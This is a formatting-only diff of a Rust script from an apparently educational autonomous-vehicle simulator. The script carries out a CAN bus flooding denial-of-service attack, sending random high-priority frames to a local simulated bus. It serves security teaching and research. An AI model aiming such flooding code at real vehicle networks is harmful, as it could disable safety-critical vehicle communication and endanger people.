@@ -1,3 +1,5 @@
+use autonomous_vehicle_sim::network::BusClient;
+use autonomous_vehicle_sim::types::{CanFrame, CanId};
 /// ATTACK SCENARIO: Bus Flooding (Denial of Service)
 ///
 /// This script demonstrates a CAN bus flooding attack where an attacker
@@ -7,12 +9,9 @@
 ///
 /// PURPOSE: Educational - demonstrates bus availability attacks
 /// DEFENSE: Rate limiting, traffic monitoring, and prioritization
-
 use colored::*;
-use std::time::Duration;
-use autonomous_vehicle_sim::network::BusClient;
-use autonomous_vehicle_sim::types::{CanId, CanFrame};
 use rand::Rng;
+use std::time::Duration;
 
 const BUS_ADDRESS: &str = "127.0.0.1:9000";
 const ATTACKER_NAME: &str = "ATTACKER_FLOOD";
@@ -25,7 +24,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("{}", "   ATTACK: Bus Flooding (DoS)          ".red().bold());
     println!("{}", "═══════════════════════════════════════".red().bold());
     println!();
-    println!("{}", "⚠️  WARNING: This is a security research tool".yellow());
+    println!(
+        "{}",
+        "⚠️  WARNING: This is a security research tool".yellow()
+    );
     println!("{}", "⚠️  Only use on authorized test systems".yellow());
     println!();
 
@@ -37,7 +39,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let (_reader, mut writer) = client.split();
 
     println!("{}", "Starting bus flooding attack:".red().bold());
-    println!("{} Sending {} frames per second", "→".red(), FRAMES_PER_SECOND);
+    println!(
+        "{} Sending {} frames per second",
+        "→".red(),
+        FRAMES_PER_SECOND
+    );
     println!("{} Using high-priority CAN IDs", "→".red());
     println!("{} This will overwhelm legitimate traffic", "→".red());
     println!();
@@ -55,11 +61,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
         let mut data = vec![0u8; 8];
         rng.fill(&mut data[..]);
 
-        let flood_frame = CanFrame::new(
-            flood_id,
-            data,
-            ATTACKER_NAME.to_string(),
-        );
+        let flood_frame = CanFrame::new(flood_id, data, ATTACKER_NAME.to_string());
 
         writer.send_frame(flood_frame).await?;
 
